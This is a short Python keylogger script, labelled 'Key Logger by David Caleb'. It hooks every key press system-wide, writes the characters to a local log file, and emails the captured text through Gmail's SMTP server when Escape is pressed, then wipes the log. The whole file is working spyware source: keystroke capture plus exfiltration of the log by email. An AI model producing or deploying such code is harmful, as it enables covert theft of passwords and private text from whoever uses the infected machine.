# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os
import smtplib
import keyboard 
import schedule
import time

# Load environment variables
load_dotenv()

# Get email credentials from environment variables
password = os.getenv('MAIL_PASSWORD')
username = os.getenv('MAIL_USERNAME')

# Function to send email with logged keys
def sendMail(keys):
    # Configure Gmail SMTP server
    server = "smtp.gmail.com"
    port = 587
    s = smtplib.SMTP(host=server, port=port)
    s.starttls()
    s.login(username, password)

    # Create email message
    msg = MIMEMultipart()
    msg["To"] = username
    msg["From"] = username
    msg["Subject"] = "Key Logger by David Caleb"
    msg.attach(MIMEText(keys, "html"))
    
    # Send the message
    s.send_message(msg)
    
    # Clean up message and close SMTP connection
    del msg
    s.quit()
    clean_log()

# Function to clean the log file
def clean_log():
    with open("KeyLog.txt", "w") as file:
        file.truncate()

# Function to handle key events
def press_key(event):
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        if len(key) == 1:
            # Regular character
            with open("KeyLog.txt", "a") as file:
                file.write(key)
        elif key == "space":
            # Space key
            with open("KeyLog.txt", "a") as file:
                file.write(" ")
        elif key == "enter":
            # Enter key
            with open("KeyLog.txt", "a") as file:
                file.write("\n")
        elif key == "esc":
            # Escape key - send email and exit
            with open("KeyLog.txt", "r") as file:
                sendMail(file.read())
            # Stop the listener
            return False  

# Start keyboard listener
keyboard.on_press(press_key)

# Continuously run the scheduler to execute pending tasks.
while True:
    schedule.run_pending()
    time.sleep(1)